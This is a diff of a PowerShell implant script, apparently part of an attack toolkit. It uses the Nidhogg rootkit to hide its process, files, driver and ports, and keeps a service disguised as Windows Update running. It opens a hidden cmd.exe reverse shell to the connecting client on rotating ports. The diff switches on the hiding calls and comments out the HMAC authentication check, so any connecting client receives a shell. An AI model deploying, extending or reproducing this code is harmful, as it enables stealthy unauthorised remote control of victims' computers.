@@ -1,11 +1,11 @@
 # Implant.ps1
 $SharedSecret = "bluewinstheday!!"
-$TriggerPort  = 443
+$TriggerPort  = 8925
 $BaseReversePort = 4444
 $CurrentReversePort = $BaseReversePort
 
 $AppDir = "C:\Windows\System32\WindowsModulesAssistant"
-$NidhoggClient = "$AppDir\wuauclt.exe"
+$NidhoggClient = "$AppDir\NidhoggClient.exe"
 
 function Log($msg) {
     Add-Content -Path "C:\Windows\Temp\debug.log" -Value "$(Get-Date -Format 'HH:mm:ss') $msg"
@@ -19,29 +19,29 @@ function Invoke-Nidhogg {
 }
 
 # Initial hiding
-# Invoke-Nidhogg "process hide $PID"
-# Invoke-Nidhogg "file hide $AppDir\Implant.ps1"
-# Invoke-Nidhogg "file hide $AppDir\wuauclt.exe"
-# Invoke-Nidhogg "port hide $TriggerPort tcp remote"
-# Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"
+Invoke-Nidhogg "process hide $PID"
+Invoke-Nidhogg "file hide $AppDir\Implant.ps1"
+Invoke-Nidhogg "file hide $AppDir\wuauclt.exe"
+Invoke-Nidhogg "port hide $TriggerPort tcp remote"
+Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"
 
 while ($true) {
     try {
         # Keep driver alive
         if ((sc.exe query WindowsUpdateSvc | Select-String "RUNNING") -eq $null) {
             sc.exe start WindowsUpdateSvc | Out-Null
-            # Invoke-Nidhogg "driver hide C:\Windows\System32\drivers\Nidhogg.sys"
+            Invoke-Nidhogg "driver hide C:\Windows\System32\drivers\Nidhogg.sys"
         }
 
         # Periodic re-hiding
         if ((Get-Random -Maximum 10) -eq 0) {
-            # Invoke-Nidhogg "process hide $PID"
-            # Invoke-Nidhogg "port hide $TriggerPort tcp remote"
-            # Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"
+            Invoke-Nidhogg "process hide $PID"
+            Invoke-Nidhogg "port hide $TriggerPort tcp remote"
+            Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"
         }
 
         # ====================== LISTENER WITH PORT FALLBACK ======================
-        $PortsToTry = @(443, 8443, 10443, 4443)
+        $PortsToTry = @(8925, 8443, 10443, 4443)
         $listener = $null
         $boundPort = $null
 
@@ -90,91 +90,80 @@ while ($true) {
                 Log "STACK: $($_.ScriptStackTrace)"
             }
 
-            $hmacKey = [System.Text.Encoding]::UTF8.GetBytes($SharedSecret)
-            $hmac = New-Object System.Security.Cryptography.HMACSHA256
-            $hmac.Key = $hmacKey
-            $challengeBytes = [System.Text.Encoding]::UTF8.GetBytes("$challenge")
-            $expectedBytes = $hmac.ComputeHash($challengeBytes)
-            $expected = -join ($expectedBytes | ForEach-Object { $_.ToString("x2") })
+            # $hmacKey = [System.Text.Encoding]::UTF8.GetBytes($SharedSecret)
+            # $hmac = New-Object System.Security.Cryptography.HMACSHA256
+            # $hmac.Key = $hmacKey
+            # $challengeBytes = [System.Text.Encoding]::UTF8.GetBytes("$challenge")
+            # $expectedBytes = $hmac.ComputeHash($challengeBytes)
+            # $expected = -join ($expectedBytes | ForEach-Object { $_.ToString("x2") })
             
-            if ($response -eq $expected) {
-                $writer.WriteLine("OK - Using port $CurrentReversePort")
-                # spawn reverse shell to client IP on $CurrentReversePort
-            } else {
-                $writer.WriteLine("DENIED")
-            }
+            # if ($response -eq $expected) {
+            #     $writer.WriteLine("OK - Using port $CurrentReversePort")
+            #     # spawn reverse shell to client IP on $CurrentReversePort
+            # } else {
+            #     $writer.WriteLine("DENIED")
+            # }
 
-            Log "Challenge sent: $challenge"
-            Log "Expected HMAC: $expected"
-            Log "Received response: $response"
+            # Log "Challenge sent: $challenge"
+            # Log "Expected HMAC: $expected"
+            # Log "Received response: $response"
 
-            if (-not [string]::IsNullOrWhiteSpace($response)) {
-                $response = $response.Trim()
-                $hmac = New-Object System.Security.Cryptography.HMACSHA256
-                $hmac.Key = [Text.Encoding]::UTF8.GetBytes($SharedSecret)
-                $expected = -join ($hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes("$challenge")) | ForEach-Object { $_.ToString("x2") })
+            # PORT DIVERSION
+            Log "Using port: $CurrentReversePort"
+            Start-Sleep -Seconds 1
 
-                if ($response -eq $expected) {
-                    # PORT DIVERSION
-                    Log "Using port: $CurrentReversePort"
-                    Start-Sleep -Seconds 1
+            $remoteIP = $client.Client.RemoteEndPoint.Address.ToString()
+            $listener.Stop()
 
-                    $remoteIP = $client.Client.RemoteEndPoint.Address.ToString()
-                    $listener.Stop()
+            # Hide new port, unhide old one
+            Invoke-Nidhogg "port unhide $CurrentReversePort tcp remote"
+            $CurrentReversePort = $CurrentReversePort + 1
+            if ($CurrentReversePort -gt 4455) { $CurrentReversePort = $BaseReversePort }
+            Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"
 
-                    # Hide new port, unhide old one
-                    Invoke-Nidhogg "port unhide $CurrentReversePort tcp remote"
-                    $CurrentReversePort = $CurrentReversePort + 1
-                    if ($CurrentReversePort -gt 4455) { $CurrentReversePort = $BaseReversePort }
-                    Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"
+            # ====================== REVERSE SHELL ======================
+            $revClient = New-Object System.Net.Sockets.TcpClient($remoteIP, $CurrentReversePort)
+            $revStream = $revClient.GetStream()
+            $revWriter = New-Object System.IO.StreamWriter($revStream)
+            $revReader = New-Object System.IO.StreamReader($revStream)
+            $revWriter.AutoFlush = $true
 
-                    # ====================== REVERSE SHELL ======================
-                    $revClient = New-Object System.Net.Sockets.TcpClient($remoteIP, $CurrentReversePort)
-                    $revStream = $revClient.GetStream()
-                    $revWriter = New-Object System.IO.StreamWriter($revStream)
-                    $revReader = New-Object System.IO.StreamReader($revStream)
-                    $revWriter.AutoFlush = $true
+            $process = New-Object System.Diagnostics.Process
+            $process.StartInfo.FileName = "cmd.exe"
+            $process.StartInfo.Arguments = "/Q"
+            $process.StartInfo.RedirectStandardInput = $true
+            $process.StartInfo.RedirectStandardOutput = $true
+            $process.StartInfo.RedirectStandardError = $true
+            $process.StartInfo.UseShellExecute = $false
+            $process.StartInfo.CreateNoWindow = $true
+            $process.StartInfo.WindowStyle = "Hidden"
+            $process.Start() | Out-Null
 
-                    $process = New-Object System.Diagnostics.Process
-                    $process.StartInfo.FileName = "cmd.exe"
-                    $process.StartInfo.Arguments = "/Q"
-                    $process.StartInfo.RedirectStandardInput = $true
-                    $process.StartInfo.RedirectStandardOutput = $true
-                    $process.StartInfo.RedirectStandardError = $true
-                    $process.StartInfo.UseShellExecute = $false
-                    $process.StartInfo.CreateNoWindow = $true
-                    $process.StartInfo.WindowStyle = "Hidden"
-                    $process.Start() | Out-Null
+            Invoke-Nidhogg "process hide $($process.Id)"
 
-                    Invoke-Nidhogg "process hide $($process.Id)"
+            # Async I/O
+            $outputAction = { param($s, $e); try { if ($e.Data) { $revWriter.WriteLine($e.Data) } } catch {} }
+            $errorAction  = { param($s, $e); try { if ($e.Data) { $revWriter.WriteLine("[ERR] $($e.Data)") } } catch {} }
 
-                    # Async I/O
-                    $outputAction = { param($s, $e); try { if ($e.Data) { $revWriter.WriteLine($e.Data) } } catch {} }
-                    $errorAction  = { param($s, $e); try { if ($e.Data) { $revWriter.WriteLine("[ERR] $($e.Data)") } } catch {} }
+            $outEvent = Register-ObjectEvent $process.StandardOutput "OutputDataReceived" -Action $outputAction
+            $errEvent = Register-ObjectEvent $process.StandardError  "ErrorDataReceived"  -Action $errorAction
 
-                    $outEvent = Register-ObjectEvent $process.StandardOutput "OutputDataReceived" -Action $outputAction
-                    $errEvent = Register-ObjectEvent $process.StandardError  "ErrorDataReceived"  -Action $errorAction
+            $process.BeginOutputReadLine()
+            $process.BeginErrorReadLine()
 
-                    $process.BeginOutputReadLine()
-                    $process.BeginErrorReadLine()
-
-                    try {
-                        while (-not $process.HasExited -and $revClient.Connected) {
-                            if ($revStream.DataAvailable) {
-                                $cmd = $revReader.ReadLine()
-                                if ($cmd) { $process.StandardInput.WriteLine($cmd) }
-                            }
-                            Start-Sleep -Milliseconds 50
-                        }
-                    } finally {
-                        if ($outEvent) { Unregister-Event -SourceIdentifier $outEvent.Name -EA SilentlyContinue }
-                        if ($errEvent) { Unregister-Event -SourceIdentifier $errEvent.Name -EA SilentlyContinue }
-                        if (-not $process.HasExited) { $process.Kill() }
-                        $revClient.Close()
+            try {
+                while (-not $process.HasExited -and $revClient.Connected) {
+                    if ($revStream.DataAvailable) {
+                        $cmd = $revReader.ReadLine()
+                        if ($cmd) { $process.StandardInput.WriteLine($cmd) }
                     }
-                } else {
-                    Log "DENIED"
+                    Start-Sleep -Milliseconds 50
                 }
+            } finally {
+                if ($outEvent) { Unregister-Event -SourceIdentifier $outEvent.Name -EA SilentlyContinue }
+                if ($errEvent) { Unregister-Event -SourceIdentifier $errEvent.Name -EA SilentlyContinue }
+                if (-not $process.HasExited) { $process.Kill() }
+                $revClient.Close()
             }
         }
         finally {
